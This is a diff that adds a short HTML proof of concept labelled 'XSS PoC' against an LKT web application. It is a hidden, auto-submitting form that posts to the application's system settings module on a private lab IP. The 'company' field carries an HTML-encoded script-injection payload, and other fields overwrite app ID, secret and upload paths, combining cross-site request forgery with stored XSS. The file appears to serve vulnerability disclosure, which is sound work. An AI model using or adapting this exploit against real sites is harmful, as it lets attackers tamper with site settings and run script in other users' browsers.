@@ -1,0 +1,20 @@
+<html>
+  <!-- XSS PoC -->
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="http://192.168.8.130/LKT/index.php?module=system" method="POST" enctype="multipart/form-data">
+      <input type="hidden" name="image" value="" />
+      <input type="hidden" name="oldpic" value="1541601350533&#46;jpeg" />
+      <input type="hidden" name="company" value="&quot;&gt;&lt;script&gt;alert&#40;&#47;x&#47;&#41;&lt;&#47;script&gt;" />
+      <input type="hidden" name="appid" value="111111" />
+      <input type="hidden" name="appsecret" value="111111" />
+      <input type="hidden" name="domain" value="http&#58;&#47;&#47;192&#46;168&#46;8&#46;130&#47;LKT&#47;index&#46;php&#63;module&#61;api" />
+      <input type="hidden" name="ip" value="" />
+      <input type="hidden" name="uploadImg&#95;domain" value="http&#58;&#47;&#47;192&#46;168&#46;8&#46;130" />
+      <input type="hidden" name="uploadImg" value="&#46;&#46;&#47;LKT&#47;images&#47;" />
+      <input type="hidden" name="upload&#95;file" value="&#46;&#46;&#47;LKT&#47;zip" />
+      <input type="hidden" name="Submit" value="" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
